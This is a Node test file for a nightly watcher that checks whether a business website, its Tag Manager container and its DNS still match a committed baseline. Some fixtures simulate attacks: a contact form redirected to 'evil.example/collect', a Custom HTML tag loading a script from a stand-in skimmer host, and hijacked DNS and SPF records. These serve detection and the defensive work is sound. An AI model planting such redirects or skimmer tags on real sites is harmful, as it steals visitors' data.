// The nightly site watch (scripts/watch-site.mjs, run by
// .github/workflows/watch-site.yml, October 2026) is the only thing that would
// tell Kyle that the live site no longer matches this repository, that
// something was added to the Tag Manager container, or that the domain's DNS
// has moved. A watcher that misses a change is worse than none, and one that
// cries wolf gets ignored, so this checks both ways, without the network:
//  - served exactly as committed, every published file passes, including the
//    contact form tag as Netlify rewrites it when it wires the form up;
//  - one changed character in one page is reported, by name, with the line;
//  - a contact form pointed at another address is reported, not forgiven as
//    Netlify's rewrite;
//  - a Tag Manager container with a new version, a Custom HTML tag or a
//    non-Google address is reported, and one shaped like the real container
//    passes;
//  - DNS answers that differ from the baseline, or a weakened DMARC, are
//    reported, and the real answers of October 2026 pass.
const { ROOT, serveRepo } = require('./lib/env');
const path = require('path');
const fs = require('fs');
const { pathToFileURL } = require('url');

let fail = 0;
const ok = (c, m) => { console.log((c ? '  PASS  ' : '  FAIL  ') + m); if (!c) fail++; };
const titles = (r) => r.problems.map((p) => p.title);

(async () => {
  const watch = await import(pathToFileURL(path.join(ROOT, 'scripts', 'watch-site.mjs')).href);
  const { BASELINE } = watch;

  console.log('\n== which files are watched ==');
  const files = watch.siteFiles(ROOT);
  ok(files.includes('index.html') && files.includes('dist/styles.css') && files.includes('plans/index.html') && files.includes('sitemap.xml'),
     `the published files are on the list (${files.length} files)`);
  ok(!files.some((f) => /^(assets-src|tests|src|scripts|\.github)\//.test(f) || /^(package\.json|package-lock\.json|tailwind\.config\.js|README\.md|CLAUDE\.md|HANDOFF\.md|netlify\.toml|\.gitignore)$/.test(f)),
     'and nothing Netlify deletes or never serves');
  const index = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');
  ok(index.includes(BASELINE.form.repo), 'the committed contact form tag is the one the baseline expects Netlify to rewrite');

  console.log('\n== the live files against the repository ==');
  // Served as committed: nothing to report.
  let site = await serveRepo();
  let r = await watch.checkSite({ site: site.base, root: ROOT, files });
  ok(r.problems.length === 0 && r.checked === files.length, `served as committed, all ${r.checked} files pass` + (r.problems.length ? ': ' + titles(r).slice(0, 3).join('; ') : ''));
  await site.close();

  // Served as Netlify serves it (the form tag rewritten) with one character
  // changed on one other page: exactly that page is reported.
  const asNetlify = (buf) => Buffer.from(buf.toString('utf8').replace(BASELINE.form.repo, BASELINE.form.live), 'utf8');
  site = await serveRepo((p, buf) => {
    if (p.endsWith(path.sep + 'index.html') && path.dirname(p) === ROOT) return asNetlify(buf);
    if (p.endsWith('terms.html')) return Buffer.from(buf.toString('utf8').replace('<title>', '<title>Hacked '), 'utf8');
    return buf;
  });
  r = await watch.checkSite({ site: site.base, root: ROOT, files });
  ok(!titles(r).some((t) => t.startsWith('index.html:')), "Netlify's rewrite of the form tag is not reported");
  const terms = r.problems.find((p) => p.title.startsWith('terms.html:'));
  ok(terms && r.problems.length === 1, 'the one changed page is the one thing reported' + (terms ? '' : ': ' + titles(r).join('; ')));
  ok(terms && /line \d+/.test(terms.detail) && terms.detail.includes('Hacked'), 'with the line that changed: ' + (terms ? terms.detail.split('\n')[0] : ''));
  await site.close();

  // The form pointed somewhere else is a changed page, not Netlify's doing.
  site = await serveRepo((p, buf) => (p.endsWith('index.html') && path.dirname(p) === ROOT)
    ? Buffer.from(buf.toString('utf8').replace(BASELINE.form.repo, "<form action='https://evil.example/collect' class='space-y-8' method='POST' name='contact'>"), 'utf8')
    : buf);
  r = await watch.checkSite({ site: site.base, root: ROOT, files: ['index.html'] });
  ok(r.problems.length === 1 && r.problems[0].detail.includes('evil.example'), 'a contact form sent to another address is reported');
  await site.close();

  // A binary file that changed is reported by size.
  site = await serveRepo((p, buf) => p.endsWith('.webp') ? Buffer.concat([buf, Buffer.from([0])]) : buf);
  r = await watch.checkSite({ site: site.base, root: ROOT, files: ['hero-home.webp'] });
  ok(r.problems.length === 1 && /bytes/.test(r.problems[0].detail), 'a changed image is reported');
  await site.close();

  console.log('\n== the Tag Manager container ==');
  const clean = 'var data = {"resource":{"version":"' + BASELINE.gtm.version + '","macros":[{"function":"__e"},{"function":"__u"},{"function":"__f"}],' +
    '"tags":[{"function":"__googtag","vtp_tagId":"G-XXXXXXX"}],"predicates":[],"rules":[]},"runtime":[]};' +
    'var a="https://www.googletagmanager.com/gtag/js",b="https://www.google-analytics.com/g/collect",c="//www.google.com/pagead";';
  r = watch.checkGtm(clean);
  ok(r.problems.length === 0, 'a container shaped like the real one passes' + (r.problems.length ? ': ' + titles(r).join('; ') : ''));
  ok(r.found.version === BASELINE.gtm.version && r.found.functions.join() === '__e,__f,__googtag,__u', 'and its version and kinds are read: ' + r.found.functions.join(', '));
  ok(r.found.hosts.join() === 'www.google-analytics.com,www.google.com,www.googletagmanager.com', 'and its addresses are read: ' + r.found.hosts.join(', '));

  const tampered = clean.replace('"version":"' + BASELINE.gtm.version + '"', '"version":"99"')
    .replace('"tags":[', '"tags":[{"function":"__html","vtp_html":"<script src=\\"https://cdn.evil-skimmer.example/s.js\\"></script>"},');
  r = watch.checkGtm(tampered);
  ok(titles(r).some((t) => t.includes('version 99')), 'a new container version is reported');
  ok(titles(r).some((t) => t.includes('__html') && t.includes('Custom HTML')), 'a Custom HTML tag is reported');
  ok(titles(r).some((t) => t.includes('cdn.evil-skimmer.example')), 'a non-Google address is reported');
  ok(r.problems.length === 3, `and nothing else (${r.problems.length} problems)`);

  console.log('\n== DNS ==');
  const answers = {
    'buildleavitt.com NS': ['aragorn.ns.cloudflare.com.', 'jillian.ns.cloudflare.com.'],
    'buildleavitt.com MX': ['1 aspmx.l.google.com.', '5 alt1.aspmx.l.google.com.', '5 alt2.aspmx.l.google.com.', '10 alt3.aspmx.l.google.com.', '10 alt4.aspmx.l.google.com.'],
    'buildleavitt.com A': ['75.2.60.5', '99.83.231.61'],
    'www.buildleavitt.com CNAME': ['buildleavitt.netlify.app.'],
    'buildleavitt.com TXT': ['"v=spf1 include:_spf.google.com ~all"', '"google-site-verification=abc"'],
    '_dmarc.buildleavitt.com TXT': ['"v=DMARC1; p=none; rua=mailto:connect@buildleavitt.com"'],
  };
  const resolver = (table) => async (name, type) => { if (!(name + ' ' + type in table)) throw new Error('no answer'); return table[name + ' ' + type]; };
  r = await watch.checkDns({ resolve: resolver(answers) });
  ok(r.problems.length === 0, 'the answers of October 2026 pass' + (r.problems.length ? ': ' + titles(r).join('; ') : ''));

  r = await watch.checkDns({ resolve: resolver({ ...answers, 'buildleavitt.com NS': ['ns1.somewhere-else.example.', 'ns2.somewhere-else.example.'] }) });
  ok(titles(r).some((t) => t.startsWith('Name servers') && t.endsWith('changed')), 'moved name servers are reported');

  r = await watch.checkDns({ resolve: resolver({ ...answers, 'www.buildleavitt.com CNAME': ['buildleavitt.pages.dev.'] }) });
  ok(titles(r).some((t) => t.startsWith('Where www.') && t.endsWith('changed')), 'www pointed elsewhere is reported');

  r = await watch.checkDns({ resolve: resolver({ ...answers, 'buildleavitt.com TXT': ['"v=spf1 +all"'] }) });
  ok(titles(r).some((t) => t.includes('SPF')), 'a loosened SPF is reported');

  r = await watch.checkDns({ resolve: resolver({ ...answers, '_dmarc.buildleavitt.com TXT': [] }) });
  ok(titles(r).some((t) => t.includes('DMARC record is gone')), 'a removed DMARC record is reported');

  r = await watch.checkDns({ base: { ...BASELINE.dns, dmarcAtLeast: 'quarantine' }, resolve: resolver(answers) });
  ok(titles(r).some((t) => t.includes('weakened to p=none')), 'a DMARC policy below the baseline is reported');

  r = await watch.checkDns({ resolve: resolver({ ...answers, '_dmarc.buildleavitt.com TXT': ['"v=DMARC1; p=reject; rua=mailto:connect@buildleavitt.com"'] }) });
  ok(r.problems.length === 0, 'a stricter DMARC policy is not');

  console.log('\n== the report ==');
  const md = watch.renderReport({ problems: [{ area: 'site', title: 'terms.html: the live copy differs from the repository', detail: '1 line differs, first at line 5' }], notes: ['n files compared'], when: new Date('2026-10-24T06:17:00Z') });
  ok(md.includes('### The live pages and files') && md.includes('terms.html') && md.includes('What to do') && md.includes('Publish deploy'), 'a report names the area, the file and what to do');
  const quiet = watch.renderReport({ problems: [], notes: ['n files compared'], when: new Date() });
  ok(quiet.startsWith('**No differences.**') && !quiet.includes('What to do'), 'a quiet night says so');

  console.log(fail === 0 ? '\nAll site watch checks passed.' : `\n${fail} failed.`);
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
